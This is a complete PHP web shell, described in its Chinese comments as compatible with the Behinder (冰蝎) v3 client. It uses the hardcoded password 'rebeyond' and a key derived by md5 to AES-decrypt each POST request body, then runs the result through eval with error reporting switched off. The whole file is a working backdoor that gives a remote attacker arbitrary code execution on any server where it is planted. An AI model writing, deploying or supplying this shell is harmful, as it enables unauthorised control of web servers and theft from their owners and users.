<?php
// 冰蝎 v3 兼容 shell：密码 "rebeyond"，密钥 = md5(password)[:16]
// 客户端发来 base64(AES-128-ECB(payload_source))；解密后 eval。
// 载荷自行 openssl_encrypt 输出（与本 shell 同密钥）。
@error_reporting(0);
@session_start();
$pass = "rebeyond";
$key  = substr(md5($pass), 0, 16);
$post = file_get_contents("php://input");
if (!$post) { return; }
$data = openssl_decrypt($post, "AES-128-ECB", $key);
if ($data === false) { header("HTTP/1.1 400 decrypt-failed"); return; }
eval($data);
